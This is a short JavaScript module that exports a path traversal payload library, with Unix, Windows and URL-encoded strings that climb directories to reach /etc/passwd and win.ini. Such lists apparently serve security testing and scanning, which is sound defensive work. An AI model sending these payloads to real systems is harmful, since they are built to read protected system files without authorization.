/*
|--------------------------------------------------------------------------
| Path Traversal Payload Library
|--------------------------------------------------------------------------
*/

module.exports = {

  unix: [

    "../../../../etc/passwd",

    "../../../etc/passwd",

    "../../etc/passwd",

    "../etc/passwd"

  ],

  windows: [

    "..\\..\\..\\Windows\\win.ini",

    "..\\..\\Windows\\win.ini",

    "..\\Windows\\win.ini"

  ],

  encoded: [

    "..%2f..%2f..%2fetc%2fpasswd",

    "%2e%2e/%2e%2e/%2e%2e/etc/passwd"

  ]

};
